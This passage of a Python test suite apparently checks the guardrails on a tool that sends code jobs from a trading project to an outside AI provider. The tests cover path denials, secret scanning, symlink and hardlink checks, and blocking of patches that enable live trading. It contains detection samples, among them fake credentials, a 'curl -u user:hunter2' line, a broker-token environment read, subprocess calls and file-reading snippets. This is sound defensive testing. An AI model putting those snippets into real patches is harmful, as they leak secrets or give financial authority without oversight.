                    spec_path,
                    "--allow-path",
                    "src",
                )
                self.assertEqual(result.returncode, 2)
                self.assertEqual(payload["error"]["code"], expected_code)

        protected = self.repo / ".claude"
        protected.mkdir()
        (protected / "task.md").write_text("Do not delegate this.\n", encoding="utf-8")
        result, payload = self._worker(
            "job",
            "create",
            "--cloud-approved",
            "--spec",
            ".claude/task.md",
            "--allow-path",
            "src",
        )
        self.assertEqual(result.returncode, 2)
        self.assertEqual(payload["error"]["code"], "allow_path_denied")

    def test_repo_root_and_protected_control_paths_are_not_delegable(self) -> None:
        for root_variant in (".", "./.", ".//", "././"):
            with self.subTest(root_variant=root_variant):
                root_result, root_payload = self._worker(
                    "job",
                    "create",
                    "--cloud-approved",
                    "--spec",
                    "task.md",
                    "--allow-path",
                    root_variant,
                )
                self.assertEqual(root_result.returncode, 2)
                self.assertEqual(root_payload["error"]["code"], "allow_path_root_denied")

        protected_paths = (
            "skills/delegate-minimax-api/runner.py",
            "docs/remediation/minimax-codex-autonomy.md",
            ".claude/settings.json",
            "configs/forex_major.yml",
            "configs/futures_micro.yml",
            "configs/paper_daily.yml",
            "configs/permissions.yml",
            "configs/universe.yml",
            "compose.yml",
            "Dockerfile",
            "pyproject.toml",
            "scripts/verify-paper-artifacts.sh",
            "scripts/verify-safety-patterns.py",
            "src/sitecustomize.py",
            "src/trading_ai/cli.py",
            "src/trading_ai/cli_paper.py",
            "src/trading_ai/config.py",
            "src/trading_ai/evaluation/approved_data.py",
            "src/trading_ai/execution/orders.py",
            "src/trading_ai/__init__.py",
            "src/trading_ai/risk/policy.py",
            "configs/risk.yml",
            "tests/test_risk_policy.py",
            "tests/test_minimax_api_worker_cli.py",
            "tests/test_minimax_patch_verify_cli.py",
        )
        for relative in protected_paths:
            path = self.repo / relative
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text("VALUE = 1\n", encoding="utf-8")
            with self.subTest(relative=relative):
                result, payload = self._worker(
                    "job",
                    "create",
                    "--cloud-approved",
                    "--spec",
                    "task.md",
                    "--allow-path",
                    relative,
                )
                self.assertEqual(result.returncode, 2)
                self.assertEqual(payload["error"]["code"], "allow_path_denied")

    def test_package_build_and_deployment_authority_manifests_are_not_delegable(self) -> None:
        protected_paths = (
            "setup.py",
            "setup.cfg",
            "requirements.txt",
            "requirements-dev.txt",
            "requirements_test.in",
            "package.json",
            "package-lock.json",
            "package.worker.json",
            "Makefile",
            "GNUmakefile",
            ".pre-commit-config.yaml",
            ".gitattributes",
            ".gitignore",
            ".gitmodules",
            "pyproject.toml",
            "uv.lock",
            "poetry.lock",
            "Pipfile.lock",
            "Cargo.toml",
            "go.mod",
            "build.gradle.kts",
            "Dockerfile.dev",
            "Containerfile",
            "compose.yaml",
            "compose.worker.yml",
            "docker-compose.yml",
            "render.yaml",
            "wrangler.toml",
        )
        for relative in protected_paths:
            path = self.repo / relative
            path.write_text("authority = true\n", encoding="utf-8")
            with self.subTest(relative=relative):
                self.assertEqual(
                    self.module.denied_reason(Path(relative)),
                    "protected_authority_manifest",
                )
                result, payload = self._worker(
                    "job",
                    "create",
                    "--cloud-approved",
                    "--spec",
                    "task.md",
                    "--allow-path",
                    relative,
                )
                self.assertEqual(result.returncode, 2)
                self.assertEqual(payload["error"]["code"], "allow_path_denied")

        allowed_near_misses = (
            "src/setup_helpers.py",
            "src/requirements_parser.py",
            "src/package_metadata.py",
            "src/makefile_parser.py",
            "src/pre_commit_notes.md",
        )
        for relative in allowed_near_misses:
            path = self.repo / relative
            path.write_text("VALUE = 1\n", encoding="utf-8")
            with self.subTest(relative=relative):
                self.assertIsNone(self.module.denied_reason(Path(relative)))
                created = self._create_job(relative)
                self.assertEqual(created["file_count"], 1)

    def test_financial_authority_test_matrix_is_not_delegable(self) -> None:
        protected = (
            "tests/test_alpaca_adapter.py",
            "tests/test_paper_account_executor.py",
            "tests/test_primary_executor_service.py",
            "tests/test_execution_journal.py",
            "tests/test_worker_daemon.py",
            "tests/test_order_authz.py",
            "tests/test_safe_flatten.py",
            "tests/test_reduce_only.py",
            "tests/test_retry_idempotency.py",
            "tests/test_live_guard.py",
            "tests/test_risk_limits.py",
            "tests/test_broker_adapter.py",
            "tests/test_order_execution.py",
            "tests/test_account_supervisor.py",
            "tests/test_fill_reconciliation_and_costs.py",
            "tests/test_paper_approval.py",
            "tests/test_canary_sizing.py",
            "tests/test_sleeve_allocation.py",
            "tests/test_telegram_control_bot.py",
            "tests/test_signal_approval_policy.py",
            "tests/test_circuit_breaker.py",
            "tests/test_close_session.py",
        )
        for relative in protected:
            with self.subTest(relative=relative):
                self.assertEqual(
                    self.module.denied_reason(Path(relative)),
                    "protected_financial_authority_test",
                )

        allowed_research = (
            "tests/test_backtest_metrics.py",
            "tests/test_feature_engineering.py",
            "tests/test_portfolio_statistics.py",
            "tests/test_research_signals.py",
        )
        for relative in allowed_research:
            with self.subTest(relative=relative):
                self.assertIsNone(self.module.denied_reason(Path(relative)))

    def test_only_python_and_documentation_text_suffixes_are_delegable(self) -> None:
        for relative in (
            "src/fixture.json",
            "src/config.yaml",
            "src/table.tsv",
            "src/document.xml",
            "src/tool.sh",
            "src/client.ts",
        ):
            with self.subTest(relative=relative):
                self.assertEqual(
                    self.module.denied_reason(Path(relative)),
                    "unsupported_delegation_suffix",
                )
        for relative in ("src/module.py", "docs/note.md", "docs/note.rst", "docs/note.txt"):
            with self.subTest(relative=relative):
                self.assertIsNone(self.module.denied_reason(Path(relative)))

    def test_secret_scanner_rejects_common_unquoted_and_bearer_credentials(self) -> None:
        cases = {
            "api.py": "API_KEY=abcdefghijklmnop\n",
            "password.yml": "password: correcthorsebattery\n",
            "authorization.txt": "Authorization: Bearer <JWT>\n",
            "telegram.py": "TELEGRAM_BOT_TOKEN=123456789:AbCdEfGhIjKlMnOpQrStUvWxYz\n",
            "aws.py": "AWS_SECRET_ACCESS_KEY=AbCdEfGhIjKlMnOpQrStUvWxYz0123456789\n",
            "jwt.py": 'value = "eyJabcdefghijk.abcdefghijklmnop.zyxwvutsrqponm"\n',
            "yaml_list.yml": "- password: correcthorsebattery\n",
            "inline_dict.py": 'config = {"password": "correcthorsebattery"}\n',
            "environment.py": "os.environ['API_KEY'] = 'correcthorsebattery'\n",
            "short_password.py": "password=hunter2\n",
            "process_environment.py": "process.env['API_KEY'] = 'hunter2'\n",
            "process_environment_dot.py": "process.env.API_KEY = 'hunter2'\n",
            "keyword_argument.py": "connect(password='hunter2')\n",
            "cli_argument.sh": "tool --password hunter2\n",
            "sequence.json": '["password", "hunter2"]\n',
            "credential.xml": "<password>hunter2</password>\n",
            "curl_basic.sh": "curl -u user:hunter2 https://example.test\n",
            "fish_secret.fish": "set -gx API_TOKEN hunter2\n",
            "dict_bearer.py": 'headers = {"Authorization": "Bearer <JWT>"}\n',
            "example_substring.py": "API_KEY=myexampleRealSecret123\n",
            "vault_substring.py": "API_KEY=myvaultRealSecret123\n",
        }
        for name, content in cases.items():
            relative = f"src/{name}"
            (self.repo / relative).write_text(content, encoding="utf-8")
            with self.subTest(name=name):
                result, payload = self._worker(
                    "job",
                    "create",
                    "--cloud-approved",
                    "--spec",
                    "task.md",
                    "--allow-path",
                    relative,
                )
                self.assertEqual(result.returncode, 2)
                expected = (
                    "secret_scan_rejected"
                    if Path(name).suffix in self.module.ALLOWED_DELEGATION_SUFFIXES
                    else "allow_path_denied"
                )
                self.assertEqual(payload["error"]["code"], expected)
                self.assertNotIn(content.strip(), result.stdout + result.stderr)

        (self.repo / "src" / "placeholder.py").write_text(
            'VALUE = "API_KEY"\n',
            encoding="utf-8",
        )
        allowed = self._create_job("src/placeholder.py")
        self.assertEqual(allowed["file_count"], 1)

        netrc = self.repo / ".netrc"
        netrc.write_text("machine example.test password hunter2\n", encoding="utf-8")
        result, payload = self._worker(
            "job",
            "create",
            "--cloud-approved",
            "--spec",
            "task.md",
            "--allow-path",
            ".netrc",
        )
        self.assertEqual(result.returncode, 2)
        self.assertEqual(payload["error"]["code"], "allow_path_denied")

    def test_hardlinks_are_rejected_for_spec_and_source_egress(self) -> None:
        external = self.root / "external.py"
        external.write_text("VALUE = 1\n", encoding="utf-8")
        source_link = self.repo / "src" / "external-link.py"
        os.link(external, source_link)

        result, payload = self._worker(
            "job",
            "create",
            "--cloud-approved",
            "--spec",
            "task.md",
            "--allow-path",
            "src/external-link.py",
        )
        self.assertEqual(result.returncode, 2)
        self.assertEqual(payload["error"]["code"], "input_hardlink_denied")

        external_spec = self.root / "external-spec.md"
        external_spec.write_text("External specification.\n", encoding="utf-8")
        os.link(external_spec, self.repo / "hardlink-spec.md")
        spec_result, spec_payload = self._worker(
            "job",
            "create",
            "--cloud-approved",
            "--spec",
            "hardlink-spec.md",
            "--allow-path",
            "src/module.py",
        )
        self.assertEqual(spec_result.returncode, 2)
        self.assertEqual(spec_payload["error"]["code"], "input_hardlink_denied")

    def test_fifo_in_allowlisted_directory_is_rejected_without_blocking(self) -> None:
        fifo_directory = self.repo / "src" / "fifo"
        fifo_directory.mkdir()
        os.mkfifo(fifo_directory / "input.pipe", mode=0o600)

        result, payload = self._worker(
            "job",
            "create",
            "--cloud-approved",
            "--spec",
            "task.md",
            "--allow-path",
            "src/fifo",
        )

        self.assertEqual(result.returncode, 2)
        self.assertEqual(payload["error"]["code"], "allow_path_type_denied")

    def test_generated_secret_is_policy_rejected(self) -> None:
        generated_secrets = (
            '+API_KEY = "correcthorsebattery"',
            '+VALUE = ["password", "hunter2"]',
            '+VALUE = "<password>hunter2</password>"',
            '+VALUE = "curl -u user:hunter2 https://example.test"',
            '+VALUE = "set -gx API_TOKEN hunter2"',
        )
        for addition in generated_secrets:
            with self.subTest(addition=addition):
                created = self._create_job("src/module.py")
                secret_patch = VALID_PATCH.replace("+VALUE = 2", addition)

                return_code, run = self._mock_run(str(created["job_id"]), secret_patch)

                self.assertEqual(return_code, 1)
                self.assertEqual(run["status"], "POLICY_REJECTED")
                self.assertEqual(run["error"]["code"], "secret_scan_rejected")
                job_directory = self.state / str(created["job_id"])
                self.assertFalse((job_directory / "provider-output.txt").exists())
                self.assertFalse((job_directory / "provider.patch").exists())

    def test_no_change_output_with_secret_is_rejected_before_persistence(self) -> None:
        created = self._create_job("src/module.py")

        return_code, run = self._mock_run(
            str(created["job_id"]),
            "NO_CHANGE\npassword=hunter2",
        )

        self.assertEqual(return_code, 1)
        self.assertEqual(run["status"], "POLICY_REJECTED")
        self.assertEqual(run["error"]["code"], "secret_scan_rejected")
        self.assertFalse((self.state / str(created["job_id"]) / "provider-output.txt").exists())

    def test_provider_cannot_enable_live_trading_in_any_allowed_patch(self) -> None:
        unsafe_modes = (
            ("+live_trading_allowed = True", "live_trading_enable_rejected"),
            ('+live_trading_allowed = "true"', "live_trading_enable_rejected"),
            ('+live_trading_authorized: "yes"', "live_trading_enable_rejected"),
            ("+paper = False", "financial_mode_change_rejected"),
            ("+submit_enabled = True", "financial_mode_change_rejected"),
            ('+trading_mode = "live"', "financial_mode_change_rejected"),
        )
        for addition, expected_code in unsafe_modes:
            with self.subTest(addition=addition):
                created = self._create_job("src/module.py")
                unsafe_patch = VALID_PATCH.replace("+VALUE = 2", addition)

                return_code, run = self._mock_run(str(created["job_id"]), unsafe_patch)

                self.assertEqual(return_code, 1)
                self.assertEqual(run["status"], "POLICY_REJECTED")
                self.assertEqual(run["error"]["code"], expected_code)
                self.assertFalse((self.state / str(created["job_id"]) / "provider-output.txt").exists())
        self.assertTrue(
            self.module.patch_enables_live_trading(
                VALID_PATCH.replace(
                    "+VALUE = 2",
                    "+live_trading_authorized:\n+    True",
                )
            )
        )

    def test_provider_cannot_create_executable_files(self) -> None:
        created = self._create_job("src")

        return_code, run = self._mock_run(str(created["job_id"]), EXECUTABLE_PATCH)

        self.assertEqual(return_code, 1)
        self.assertEqual(run["status"], "POLICY_REJECTED")
        self.assertEqual(run["error"]["code"], "provider_patch_unsafe")

    def test_provider_cannot_add_startup_hooks_or_protected_capabilities(self) -> None:
        startup_job = self._create_job("src")
        return_code, startup = self._mock_run(str(startup_job["job_id"]), STARTUP_HOOK_PATCH)
        self.assertEqual(return_code, 1)
        self.assertEqual(startup["status"], "POLICY_REJECTED")
        self.assertEqual(startup["policy_violations"], ["src/sitecustomize.py"])

        additions = (
            "+from trading_ai.execution.live_connection import build_alpaca_live_runtime",
            '+VALUE = os.getenv("BROKER_TOKEN")',
            "+VALUE = subprocess.run(['true'])",
        )
        for addition in additions:
            with self.subTest(addition=addition):
                created = self._create_job("src/module.py")
                unsafe_patch = VALID_PATCH.replace("+VALUE = 2", addition)

                code, run = self._mock_run(str(created["job_id"]), unsafe_patch)

                self.assertEqual(code, 1)
                self.assertEqual(run["status"], "POLICY_REJECTED")
                self.assertEqual(run["error"]["code"], "prohibited_capability_rejected")

        ast_job = self._create_job("src/module.py")
        ast_code, ast_result = self._mock_run(str(ast_job["job_id"]), AST_EGRESS_PATCH)
        self.assertEqual(ast_code, 1)
        self.assertEqual(ast_result["status"], "POLICY_REJECTED")
        self.assertEqual(ast_result["error"]["code"], "prohibited_capability_rejected")

    def test_python_purity_rejects_dynamic_and_reflective_baselines_before_egress(self) -> None:
        sources = (
            'from os import getenv as read_env\nVALUE = read_env("SAFE_NAME")\n',
            "reader = open\nVALUE = reader('local.txt').read()\n",
            "VALUE = __builtins__['open']('local.txt').read()\n",
            "VALUE = getattr(__builtins__, 'open')('local.txt').read()\n",
            "import site as runtime_site\nruntime_site.addsitedir('/tmp/plugins')\nVALUE = 1\n",
            "import inspect\nVALUE = inspect.currentframe()\n",
            "import pickle\nVALUE = pickle.loads(b'x')\n",
            "import marshal\nVALUE = marshal.loads(b'x')\n",
            "if False:\n    VALUE = client.request('GET', '/')\nelse:\n    VALUE = 1\n",
        )
        for source in sources:
            with self.subTest(source=source):
                (self.repo / "src" / "module.py").write_text(source, encoding="utf-8")
                result, payload = self._worker(
                    "job",
                    "create",
                    "--cloud-approved",
                    "--spec",
                    "task.md",
                    "--allow-path",
                    "src/module.py",
                )
                self.assertEqual(result.returncode, 2)
                self.assertEqual(payload["error"]["code"], "prohibited_python_source")

    def test_python_files_with_filesystem_or_urllib3_capabilities_are_not_delegable(self) -> None:
        additions = (
            "+from pathlib import Path\n+VALUE = Path.home().joinpath('x').read_text()",
            "+import urllib3\n+VALUE = urllib3.PoolManager().request('GET', 'https://example.invalid')",
            "+import io\n+VALUE = io.open('x').read()",
            "+import builtins\n+VALUE = builtins.open('x').read()",
            "+VALUE = open('x').read()",
            "+VALUE = __builtins__['open']('x').read()",
            "+VALUE = getattr(__builtins__, 'open')('x').read()",
            "+import site as runtime_site\n+VALUE = runtime_site.addsitedir('/tmp/plugins')",
            "+import inspect\n+VALUE = inspect.currentframe()",
            "+import pickle\n+VALUE = pickle.loads(b'x')",
            "+import marshal\n+VALUE = marshal.loads(b'x')",
        )
        for addition in additions:
            with self.subTest(addition=addition):
                created = self._create_job("src/module.py")
                patch = VALID_PATCH.replace("+VALUE = 2", addition)

                code, result = self._mock_run(str(created["job_id"]), patch)

                self.assertEqual(code, 1)
                self.assertEqual(result["status"], "POLICY_REJECTED")
                self.assertEqual(result["error"]["code"], "prohibited_capability_rejected")

        alias_job = self._create_job("src/module.py")
        alias_patch = VALID_PATCH.replace("@@ -1 +1 @@", "@@ -1 +1,2 @@").replace(
            "+VALUE = 2",
            "+reader = open\n+VALUE = reader('x').read()",
        )
        alias_code, alias_result = self._mock_run(str(alias_job["job_id"]), alias_patch)
        self.assertEqual(alias_code, 1)
        self.assertEqual(alias_result["status"], "POLICY_REJECTED")
        self.assertEqual(
            alias_result["policy_violations"],
            ["src/module.py:prohibited_python_capability"],
        )

    def test_run_rechecks_python_purity_before_token_or_post(self) -> None:
        created = self._create_job("src/module.py")
        (self.repo / "src" / "module.py").write_text(
            "if False:\n    VALUE = open('local.txt').read()\nelse:\n    VALUE = 1\n",
            encoding="utf-8",
        )
        args = argparse.Namespace(
            repo=str(self.repo),
            state_dir=str(self.state),
            job_id=str(created["job_id"]),
            fish_config=str(self.fish_config),
            reasoning="none",
            max_output_tokens=32_000,
            timeout_seconds=30.0,
            queue_timeout_seconds=0.0,
            json=True,
        )
        with (
            mock.patch.object(self.module, "load_fish_token") as token_loader,
            mock.patch.object(self.module, "api_create_response") as api_request,
            self.assertRaises(self.module.WorkerError) as raised,
        ):
            self.module.command_job_run(args)
        self.assertEqual(raised.exception.code, "prohibited_python_source")
        token_loader.assert_not_called()
        api_request.assert_not_called()

    def test_executable_selected_source_and_spec_are_rejected_and_mode_is_revalidated(self) -> None:
        source = self.repo / "src" / "module.py"
        source.chmod(0o700)
        result, payload = self._worker(
            "job",
            "create",
            "--cloud-approved",
            "--spec",
            "task.md",
            "--allow-path",
            "src/module.py",
        )
        self.assertEqual(result.returncode, 2)
        self.assertEqual(payload["error"]["code"], "executable_source_denied")

        source.chmod(0o600)
        self.spec.chmod(0o700)
        result, payload = self._worker(
            "job",
            "create",
            "--cloud-approved",
            "--spec",
            "task.md",
            "--allow-path",
            "src/module.py",
        )
        self.assertEqual(result.returncode, 2)
        self.assertEqual(payload["error"]["code"], "executable_source_denied")

        self.spec.chmod(0o600)
        created = self._create_job("src/module.py")
        source.chmod(0o700)
        args = argparse.Namespace(
            repo=str(self.repo),
            state_dir=str(self.state),
            job_id=str(created["job_id"]),
            fish_config=str(self.fish_config),
            reasoning="none",
            max_output_tokens=32_000,
            timeout_seconds=30.0,
            queue_timeout_seconds=0.0,
            json=True,
        )
        with (
            mock.patch.object(self.module, "api_create_response") as api_request,
            self.assertRaises(self.module.WorkerError) as raised,
        ):
            self.module.command_job_run(args)
        self.assertEqual(raised.exception.code, "source_snapshot_changed")
        api_request.assert_not_called()

    def test_private_artifacts_never_follow_or_replace_prepositioned_symlinks(self) -> None:
        created = self._create_job("src/module.py")
        directory = self.state / str(created["job_id"])
        sentinel = self.root / "artifact-sentinel"
        sentinel.write_text("preserve-me\n", encoding="utf-8")

        for name in ("provider-output.txt", "provider.patch", "changes.patch"):
            with self.subTest(name=name):
                target = directory / name
                os.symlink(sentinel, target)
                with self.assertRaises(self.module.WorkerError) as raised:
                    self.module.create_private_artifact(directory, name, b"attacker-controlled")
                self.assertEqual(raised.exception.code, "artifact_already_exists")
                self.assertEqual(sentinel.read_text(encoding="utf-8"), "preserve-me\n")
                self.assertTrue(target.is_symlink())
                target.unlink()

    def test_job_lifecycle_fails_closed_on_prepositioned_artifact_symlinks(self) -> None:
        sentinel = self.root / "lifecycle-artifact-sentinel"
        sentinel.write_text("preserve-lifecycle\n", encoding="utf-8")
        for name in ("provider-output.txt", "provider.patch", "changes.patch"):
            with self.subTest(name=name):
                created = self._create_job("src/module.py")
                directory = self.state / str(created["job_id"])
                os.symlink(sentinel, directory / name)
                args = argparse.Namespace(
                    repo=str(self.repo),
                    state_dir=str(self.state),
                    job_id=str(created["job_id"]),
                    fish_config=str(self.fish_config),
                    reasoning="none",
                    max_output_tokens=32_000,
                    timeout_seconds=30.0,
                    queue_timeout_seconds=0.0,
                    json=True,
                )
                with (
                    mock.patch.object(self.module, "load_fish_token") as token_loader,
                    mock.patch.object(self.module, "api_create_response") as api_request,
                    self.assertRaises(self.module.WorkerError) as raised,
                ):
                    self.module.command_job_run(args)

                self.assertEqual(raised.exception.code, "reserved_artifact_prepositioned")
                token_loader.assert_not_called()
                api_request.assert_not_called()
                self.assertEqual(sentinel.read_text(encoding="utf-8"), "preserve-lifecycle\n")

    def test_nonfinite_network_and_queue_timeouts_are_rejected_without_waiting(self) -> None:
        cases = (
            (["doctor", "--timeout-seconds", "nan"], "invalid_timeout"),
            (
                [
                    "job",
                    "run",
                    "a" * 20,
                    "--queue-timeout-seconds",
                    "nan",
                ],
                "invalid_queue_timeout",
            ),
            (["doctor", "--timeout-seconds", "inf"], "invalid_timeout"),
            (["doctor", "--timeout-seconds", "1800.0001"], "invalid_timeout"),
            (["doctor", "--timeout-seconds", "1e308"], "invalid_timeout"),
        )
        for arguments, expected_code in cases:
            with self.subTest(arguments=arguments):
                result, payload = self._worker(*arguments)
                self.assertEqual(result.returncode, 2)
                self.assertEqual(payload["error"]["code"], expected_code)
                self.assertNotIn("NaN", result.stdout)

        with (
            self.assertRaises(self.module.WorkerError) as raised,
            self.module.global_api_slot(float("nan")),
        ):
            self.fail("non-finite queue timeout must fail before locking")
        self.assertEqual(raised.exception.code, "invalid_queue_timeout")

    def test_input_file_count_is_bounded_on_create_and_revalidation(self) -> None:
        too_many = self.repo / "src" / "too_many"
        too_many.mkdir()
        for index in range(self.module.MAX_INPUT_FILES + 1):
            (too_many / f"f{index:03d}.py").write_text(f"VALUE = {index}\n", encoding="utf-8")
        result, payload = self._worker(
            "job",
            "create",
            "--cloud-approved",
            "--spec",
            "task.md",
            "--allow-path",
            "src/too_many",
        )
        self.assertEqual(result.returncode, 2)
        self.assertEqual(payload["error"]["code"], "snapshot_file_limit")

        bounded = self.repo / "src" / "bounded"
        bounded.mkdir()
        for index in range(self.module.MAX_INPUT_FILES):
            (bounded / f"f{index:03d}.py").write_text(f"VALUE = {index}\n", encoding="utf-8")
        created = self._create_job("src/bounded")
        (bounded / "overflow.py").write_text("VALUE = 999\n", encoding="utf-8")
        args = argparse.Namespace(
            repo=str(self.repo),
            state_dir=str(self.state),
            job_id=str(created["job_id"]),
            fish_config=str(self.fish_config),
            reasoning="none",
            max_output_tokens=32_000,
            timeout_seconds=30.0,
            queue_timeout_seconds=0.0,
            json=True,
        )
        with self.assertRaises(self.module.WorkerError) as raised:
            self.module.command_job_run(args)
        self.assertEqual(raised.exception.code, "source_snapshot_changed")

    def test_allow_path_count_is_bounded_and_spec_cannot_be_duplicated(self) -> None:
        arguments = [
            "job",
            "create",
            "--cloud-approved",
            "--spec",
            "task.md",
        ]
        for _ in range(self.module.MAX_INPUT_FILES + 1):
            arguments.extend(("--allow-path", "src/module.py"))
        result, payload = self._worker(*arguments)
        self.assertEqual(result.returncode, 2)
        self.assertEqual(payload["error"]["code"], "allow_path_count_limit")

        duplicate_result, duplicate = self._worker(
            "job",
            "create",
            "--cloud-approved",
            "--spec",
            "task.md",
            "--allow-path",
            "task.md",
        )
        self.assertEqual(duplicate_result.returncode, 2)
        self.assertEqual(duplicate["error"]["code"], "spec_in_allowlist_denied")
        orphan_job_directories = [
            path.name
            for path in self.state.iterdir()
            if path.is_dir() and self.module.JOB_ID_RE.fullmatch(path.name)
        ]
        self.assertEqual(orphan_job_directories, [])

    def test_source_and_spec_drift_block_run_and_export(self) -> None:
        created = self._create_job("src/module.py")
        (self.repo / "src" / "module.py").write_text("VALUE = 7\n", encoding="utf-8")
        args = argparse.Namespace(
            repo=str(self.repo),
            state_dir=str(self.state),
            job_id=str(created["job_id"]),
            fish_config=str(self.fish_config),
            reasoning="none",
            max_output_tokens=32_000,
            timeout_seconds=30.0,
            queue_timeout_seconds=0.0,
            json=True,
        )
        with self.assertRaises(self.module.WorkerError) as raised:
            self.module.command_job_run(args)
        self.assertEqual(raised.exception.code, "source_snapshot_changed")

        (self.repo / "src" / "module.py").write_text("VALUE = 1\n", encoding="utf-8")
        patch_ready = self._create_job("src/module.py")
        code, _ = self._mock_run(str(patch_ready["job_id"]), VALID_PATCH)
        self.assertEqual(code, 0)
        self.spec.write_text("A changed specification.\n", encoding="utf-8")
        result, payload = self._worker("job", "diff", str(patch_ready["job_id"]))
        self.assertEqual(result.returncode, 1)
        self.assertEqual(payload["error"]["code"], "source_spec_changed")

    def test_schema_v2_is_rejected_cleanly(self) -> None:
        created = self._create_job("src/module.py")
        root = self.module.state_root(self.repo, str(self.state))
        manifest_path = self.state / str(created["job_id"]) / "job.json"
        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
        manifest["schema_version"] = "2.0"
        self.module.write_job(root, manifest_path, manifest)

        result, payload = self._worker("job", "status", str(created["job_id"]))

        self.assertEqual(result.returncode, 1)
        self.assertEqual(payload["error"]["code"], "job_schema_unsupported")

    def test_state_root_ignores_temp_environment_and_never_accepts_tmp_itself(self) -> None:
        hostile = self.root / "hostile-tmp"
        hostile.mkdir()
        with mock.patch.dict(
            os.environ,
            {
                "TMPDIR": str(hostile),
                "TEMP": str(hostile),
                "TMP": str(hostile),
                "MINIMAX_API_WORKER_STATE_DIR": str(hostile / "state"),
            },
            clear=False,
        ):
            root = self.module.state_root(self.repo, None)
        fixed_tmp = Path("/tmp")  # noqa: S108 - verifies the runner's intentional fixed boundary
        self.assertEqual(root.parent.parent, fixed_tmp / f"minimax-api-worker-{os.getuid()}")
        self.assertFalse((hostile / "state").exists())
        if root.is_dir():
            shutil.rmtree(root)

        before_mode = os.stat(fixed_tmp).st_mode
        result = subprocess.run(  # noqa: S603 - controlled test CLI invocation
            [
                sys.executable,
                str(WORKER),
                "--json",
                "--repo",
                str(self.repo),
                "--state-dir",
                str(fixed_tmp),
                "--fish-config",
                str(self.fish_config),
                "--test-only-fish-config",
                "job",
                "create",
                "--cloud-approved",
                "--spec",
                "task.md",
                "--allow-path",
                "src",
            ],
            check=False,
            text=True,
            capture_output=True,
        )
        self.assertEqual(result.returncode, 2)
        self.assertEqual(json.loads(result.stdout)["error"]["code"], "state_dir_denied")
        self.assertEqual(os.stat(fixed_tmp).st_mode, before_mode)

    def test_global_api_slot_serializes_jobs_and_recovers(self) -> None:
        with (
            self.module.global_api_slot(0.0),
            self.assertRaises(self.module.WorkerError) as raised,
            self.module.global_api_slot(0.0),
        ):
            self.fail("second slot should not be acquired")
        self.assertEqual(raised.exception.code, "provider_concurrency_limited")
        with self.module.global_api_slot(0.0):
            pass

    def test_prepositioned_global_request_guard_is_never_followed_or_replaced(self) -> None:
        base = self.module.worker_temp_base()
        guard_path = base / self.module.PROVIDER_REQUEST_GUARD
        self.assertFalse(guard_path.exists() or guard_path.is_symlink())
        sentinel = self.root / "global-guard-sentinel"
        sentinel.write_text("preserve-global-guard\n", encoding="utf-8")
        sentinel.chmod(0o600)
        for kind in ("symlink", "regular"):
            with self.subTest(kind=kind):
                created = self._create_job("src/module.py")
                job_id = str(created["job_id"])
                if kind == "symlink":
                    os.symlink(sentinel, guard_path)
                    expected = sentinel.read_bytes()
                else:
                    expected = b'{"invalid":"prepositioned"}\n'
                    guard_path.write_bytes(expected)
                    guard_path.chmod(0o600)
                args = argparse.Namespace(
                    repo=str(self.repo),
                    state_dir=str(self.state),
                    job_id=job_id,
                    fish_config=str(self.fish_config),
                    reasoning="none",
                    max_output_tokens=32_000,
                    timeout_seconds=30.0,
                    queue_timeout_seconds=0.0,
                    json=True,
                )
                try:
                    with (
                        mock.patch.object(self.module, "load_fish_token") as token_loader,
                        mock.patch.object(self.module, "api_create_response") as api_request,
                        self.assertRaises(self.module.WorkerError) as raised,
                    ):
                        self.module.command_job_run(args)
                    self.assertEqual(raised.exception.code, "provider_concurrency_poisoned")
                    token_loader.assert_not_called()
                    api_request.assert_not_called()
                    if kind == "symlink":
                        self.assertTrue(guard_path.is_symlink())
                        self.assertEqual(sentinel.read_bytes(), expected)
                    else:
                        self.assertTrue(guard_path.is_file())
                        self.assertFalse(guard_path.is_symlink())
                        self.assertEqual(guard_path.read_bytes(), expected)
                finally:
                    if guard_path.exists() or guard_path.is_symlink():
                        guard_path.unlink()

    def test_created_job_guard_reconciles_only_after_global_slot_is_acquired(self) -> None:
        created = self._create_job("src/module.py")
        job_id = str(created["job_id"])
        root = self.module.state_root(self.repo, str(self.state))
        directory, job = self.module.load_job(self.repo, root, job_id)
        payload = self.module.build_api_payload(
            directory,
            job,
            reasoning="none",
            max_output_tokens=32_000,
        )
        with self.module.global_api_slot(0.0):
            guard_data, guard_identity, _ = self.module.create_provider_request_guard(root, job, payload)
        try:
            current = self.module.read_provider_request_guard(self.module.worker_temp_base())
            self.assertIsNotNone(current)
            assert current is not None
            self.assertEqual((current[1].st_dev, current[1].st_ino), guard_identity)

            create_result, create_payload = self._worker(
                "job",
                "create",
                "--cloud-approved",
                "--spec",
                "task.md",
                "--allow-path",
                "src/module.py",
            )
            self.assertEqual(create_result.returncode, 1)
            self.assertEqual(create_payload["error"]["code"], "provider_concurrency_poisoned")
            unchanged = self.module.read_provider_request_guard(self.module.worker_temp_base())
            self.assertIsNotNone(unchanged)
            assert unchanged is not None
            self.assertEqual(unchanged[0], guard_data)
            self.assertEqual((unchanged[1].st_dev, unchanged[1].st_ino), guard_identity)

            with (
                mock.patch.object(self.module, "api_create_response") as api_request,
                self.module.global_api_slot(0.0),
            ):
                self.assertIsNone(
                    self.module.read_provider_request_guard(self.module.worker_temp_base())
                )
            api_request.assert_not_called()
        finally:
            current = self.module.read_provider_request_guard(self.module.worker_temp_base())
            if current is not None:
                self.module.remove_provider_request_guard(
                    current[0],
                    (current[1].st_dev, current[1].st_ino),
                    missing_ok=True,
                )

    def test_unconfirmed_provider_child_poison_blocks_future_api_slots(self) -> None:
        marker = self.module.worker_temp_base() / self.module.API_CALL_POISON
        if marker.exists() or marker.is_symlink():
            marker.unlink()
        try:
            self.module.persist_api_poison(os.getpid())
            with (
                self.assertRaises(self.module.WorkerError) as raised,
                self.module.global_api_slot(0.0),
            ):
                self.fail("poisoned slot must not be acquired")
            self.assertEqual(raised.exception.code, "provider_concurrency_poisoned")
        finally:
            if marker.exists() or marker.is_symlink():
                marker.unlink()

    def test_run_revalidates_source_inside_global_api_slot_before_post(self) -> None:
        cases = (
            (
                "spec",
                lambda: self.spec.write_text("Changed while queued.\n", encoding="utf-8"),
                "source_spec_changed",
            ),
            (
                "source",
                lambda: (self.repo / "src" / "module.py").write_text("VALUE = 7\n", encoding="utf-8"),
                "source_snapshot_changed",
            ),
        )
        for name, mutate, expected_code in cases:
            with self.subTest(name=name):
